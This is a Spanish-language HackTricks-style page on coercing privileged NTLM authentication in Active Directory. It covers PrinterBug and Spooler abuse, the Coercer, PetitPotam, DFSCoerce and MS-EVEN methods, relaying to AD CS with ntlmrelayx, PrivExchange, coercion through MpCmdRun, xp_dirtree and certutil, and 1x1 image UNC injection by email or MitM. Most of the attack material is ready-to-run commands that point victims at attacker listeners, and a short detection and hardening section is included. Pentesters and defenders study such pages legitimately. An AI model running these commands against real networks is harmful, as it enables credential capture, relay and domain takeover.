# Forzar la autenticación privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **remote authentication triggers** programados en C# mediante el compilador MIDL para evitar dependencias de terceros.

## Abuso del servicio Spooler

Si el servicio _**Print Spooler**_ está **habilitado,** puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Domain Controller una **actualización** sobre los nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Ten en cuenta que, cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta del equipo** en esta autenticación.

Internamente, el primitive clásico **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** a través de **`\\PIPE\\spoolss`**. Primero, el atacante abre un handle de impresora/servidor y después proporciona un nombre de cliente falso en `pszLocalMachine`, por lo que el spooler objetivo crea un canal de notificación **de vuelta al host controlado por el atacante**. Por eso el efecto es una **coerción de autenticación saliente** en lugar de una ejecución directa de código.<sup>[[2]](#references)</sup>\
Si buscas **RCE/LPE** en el propio spooler, consulta [PrintNightmare](printnightmare.md). Esta página se centra en la **coerción y el relay**.

### Encontrar servidores Windows en el dominio

Usa PowerShell para enumerar los hosts Windows. Los servidores suelen ser los objetivos prioritarios, así que céntrate primero en ellos:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Detección de servicios Spooler en escucha

Usando una versión ligeramente modificada de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), comprueba si el Spooler Service está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar `rpcdump.py` en Linux y buscar el protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
O prueba rápidamente hosts desde Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si quieres **enumerar las superficies de coerción** en lugar de limitarte a comprobar si existe el endpoint del spooler, usa **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Esto es útil porque ver el endpoint en EPM solo te indica que la interfaz RPC de impresión está registrada. **No** garantiza que todos los métodos de coerción sean accesibles con tus privilegios actuales ni que el host genere un flujo de autenticación utilizable.

### Pedir al servicio que se autentique contra un host arbitrario

Puedes compilar [SpoolSample desde aquí](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puedes dirigirte directamente a las interfaces del **spooler** y evitar adivinar qué método RPC está expuesto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Callbacks modernos de RPC-over-TCP

No asumas que una llamada `RpcRemoteFindFirstPrinterChangeNotificationEx` exitosa debe generar tráfico en TCP/445. **Windows 11 22H2 y versiones posteriores usan RPC over TCP para las comunicaciones de impresión de forma predeterminada**; RPC sobre named pipes está deshabilitado, a menos que una policy o `RpcUseNamedPipeProtocol=1` lo restablezca. Por lo tanto, los listeners antiguos que solo admiten SMB pueden informar que el trigger se envió, aunque nunca reciban el callback. Microsoft documenta TCP/135 (Endpoint Mapper) más puertos RPC dinámicos para el RPC de impresión normal, y las organizaciones pueden restringir este rango o seleccionar un puerto RPC fijo para impresión.<sup>[[10]](#references)</sup>

La versión actual de **Impacket `ntlmrelayx.py`** incluye un servidor de RPC y un Endpoint Mapper pequeño, habilitado de forma predeterminada en TCP/135. Este soporte se integró en junio de 2025 específicamente con una cadena PrinterBug-to-AD-CS demostrada, lo que permite relaying del callback RPC autenticado incluso cuando la víctima no hace fallback a SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Busca `Setting up RPC Server on port 135` y `RPCD: Received connection` en la salida de relay. Si la llamada RPC devuelve un error esperado, pero nada llega al listener, comprueba la print RPC transport policy de la víctima, el filtrado de salida, la resolución DNS y si otro proceso ya está usando TCP/135. Asegúrate también de que `ntlmrelayx` no se haya iniciado con `--no-rpc-server`.

### Forzando HTTP en lugar de SMB con WebClient

En sistemas que todavía usan **RPC over named pipes** (builds antiguos o comportamiento restaurado por la policy), el PrinterBug clásico suele generar una autenticación **SMB** hacia `\\attacker\share`, lo que sigue siendo útil para **capture**, **relay to HTTP targets** o **relay where SMB signing is absent**.\
Sin embargo, hacer relay de **SMB a SMB** suele estar bloqueado por **SMB signing**, por lo que los operadores pueden preferir forzar la autenticación **HTTP/WebDAV**. Esto no es un fallback para el comportamiento de RPC-over-TCP descrito anteriormente.

Si el servicio **WebClient** está ejecutándose en el target, el listener puede especificarse con un formato que hace que Windows use **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Esto resulta especialmente útil al encadenarlo con **`ntlmrelayx --adcs`** u otros destinos de HTTP relay, ya que evita depender de la posibilidad de realizar SMB relay en la conexión forzada. La consideración importante es que **WebClient debe estar ejecutándose** en la víctima para que funcione la variante HTTP/WebDAV.

### Combinación con Unconstrained Delegation

Si un atacante ha comprometido un equipo configurado para [Unconstrained Delegation](unconstrained-delegation.md), puede **forzar a la impresora a autenticarse en ese equipo**. El **TGT** de la cuenta de equipo de la impresora se almacena entonces en la memoria del host con Unconstrained Delegation, donde el atacante puede recuperarlo y reutilizarlo con [Pass the Ticket](pass-the-ticket.md).

### Notas sobre detección y hardening

La forma más fiable de eliminar PrinterBug de un DC, PAW o servidor que no imprime es detener y deshabilitar el Spooler. Cuando sea necesario imprimir, refuerza todos los posibles destinos de relay (SMB server signing, LDAP signing/channel binding y EPA en servicios HTTP como AD CS), en lugar de asumir que bloquear TCP/445 en la ruta de callback es suficiente.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
La detección debe correlacionar una llamada autenticada al UUID de MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, especialmente los opnum 62/65 con un valor de callback no local, y una conexión saliente inmediata SMB, HTTP o RPC desde el host del spooler. Establece una línea base de **interface UUID/opnum y pares de origen/destino**, no solo del acceso a `\PIPE\spoolss`, porque los print stacks actuales pueden colocar el callback sobre RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## Forzar autenticación RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matriz de coerción de rutas UNC mediante RPC (interfaces/opnums que activan autenticación saliente)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interfaz de impresión asíncrona en el mismo pipe del spooler; utiliza Coercer para enumerar métodos accesibles en un host determinado<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (también mediante \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comúnmente abusados: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: estos métodos aceptan parámetros que pueden contener una ruta UNC (por ejemplo, `\\attacker\share`). Al procesarlos, Windows se autenticará (en el contexto de la máquina/usuario) en esa UNC, lo que permite capturar o relaying de NetNTLM.\
Para el abuso del spooler, **MS-RPRN opnum 65** sigue siendo la primitive más común y mejor documentada, porque la especificación del protocolo indica explícitamente que el servidor crea un canal de notificación de vuelta al cliente especificado por `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Coerción de MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN sobre \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: el objetivo intenta abrir la ruta de backup log proporcionada y se autentica en la UNC controlada por el atacante.<sup>[[1]](#references)</sup>
- Practical use: coaccionar activos Tier 0 (DC/RODC/Citrix/etc.) para que emitan NetNTLM y, después, hacer relay hacia endpoints de AD CS (escenarios ESC8/ESC11) u otros servicios privilegiados.<sup>[[1]](#references)</sup>

## PrivExchange

El ataque `PrivExchange` es el resultado de un fallo encontrado en la **feature `PushSubscription` de Exchange Server**. Esta feature permite forzar al servidor de Exchange, mediante cualquier usuario del dominio que tenga un buzón, a autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

De forma predeterminada, el **servicio de Exchange se ejecuta como SYSTEM** y recibe privilegios excesivos (concretamente, tiene **privilegios WriteDacl en el dominio antes de la Cumulative Update de 2019**). Este fallo puede explotarse para permitir el **relaying de información hacia LDAP y posteriormente extraer la base de datos NTDS del dominio**. Cuando no es posible hacer relay hacia LDAP, este fallo todavía puede utilizarse para hacer relay y autenticarse en otros hosts del dominio. La explotación exitosa de este ataque concede acceso inmediato a Domain Admin con cualquier cuenta de usuario autenticada del dominio.

## Dentro de Windows

Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
O usa esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible usar certutil.exe lolbin (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Mediante correo electrónico

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que quieres comprometer, simplemente podrías enviarle un **correo electrónico con una imagen de 1x1** como la siguiente:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Cuando la víctima lo abre, Windows intenta autenticarse.

### MitM

Si puedes realizar un ataque MitM e inyectar HTML en una página que la víctima esté viendo, intenta inyectar una imagen como:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Otras formas de forzar y hacer phishing de la autenticación NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si puedes capturar [desafíos NTLMv1, aquí puedes leer cómo crackearlos](../ntlm/index.html#ntlmv1-attack).\
_Recuerda que, para crackear NTLMv1, debes configurar el challenge de Responder como "1122334455667788"_

## References

- [1] [Unit 42 – La coerción de autenticación sigue evolucionando](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocolo de EventLog Remoting](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Actualizaciones de la conexión RPC para impresión en Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Servidor de relay RPC y Endpoint Mapper para ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
